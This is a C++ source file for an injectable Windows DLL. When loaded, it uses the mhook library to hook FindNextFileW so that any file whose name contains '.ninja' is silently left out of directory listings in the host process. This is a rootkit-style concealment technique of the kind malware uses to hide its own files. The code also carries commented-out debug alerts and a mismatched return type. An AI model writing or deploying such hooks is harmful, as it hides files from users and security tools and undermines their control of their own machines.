#include "stdafx.h"
#include "mhook/mhook-lib/mhook.h"
#define  TARGET_FUNCTION ("FindFirstFileW")
#define  TARGET_FUNCTIONB ("FindNextFileW")


#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)




typedef NTSTATUS(WINAPI *FIND_NEXT_FILEW)(
	_In_ HANDLE lpFileName,
	_Out_ LPWIN32_FIND_DATAW lpFindFileData
	);

FIND_NEXT_FILEW  originalFindNextFileW = (FIND_NEXT_FILEW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), TARGET_FUNCTIONB);




	NTSTATUS WINAPI HookedFindNextFileW(
		_In_ HANDLE hFindFile,
		_Out_ LPWIN32_FIND_DATAW lpFindFileData
		)


	{
		//MessageBox(0, L"originalFindNextFileW", L"ALERT", MB_OK);
		NTSTATUS status = originalFindNextFileW(hFindFile, lpFindFileData);
		//MessageBox(0, L"while", L"ALERT", MB_OK);		
		while (wcsstr(lpFindFileData->cFileName, L".ninja") != NULL)
		{
			//MessageBox(0, L"FindNextFileW", L"ALERT", MB_OK);
			if (!originalFindNextFileW(hFindFile, lpFindFileData))
			{
				//MessageBox(0, L"nofile", L"ALERT", MB_OK);
				return 0;
			}
			//MessageBox(0, L"endWhile", L"ALERT", MB_OK);
		}
		return status;
	}

BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{        
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
		//Mhook_SetHook((PVOID*)&originalFindFirstFileW, HookedFindFirstFileW);
		Mhook_SetHook((PVOID*)&originalFindNextFileW, HookedFindNextFileW);
        break;

    }

    return TRUE;
}